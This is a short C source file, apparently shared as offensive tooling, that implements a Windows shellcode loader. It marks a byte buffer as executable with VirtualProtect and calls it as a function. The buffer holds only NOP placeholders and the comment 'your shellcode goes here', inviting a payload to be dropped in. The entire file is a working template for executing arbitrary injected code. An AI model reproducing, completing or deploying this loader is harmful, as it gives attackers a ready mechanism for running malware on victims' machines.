#include <windows.h>
#include <stdio.h>

// Shellcode Loader for Windows
// Author: payloads45

unsigned char shellcode[] = 
"\x90\x90\x90\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90\x90\x90\x90\x90"; //your shellcode goes here

int main() {
    DWORD oldProtection;
    VirtualProtect(&shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtection);
    printf("Shellcode Size: %d\n", sizeof(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
    return 0;
}
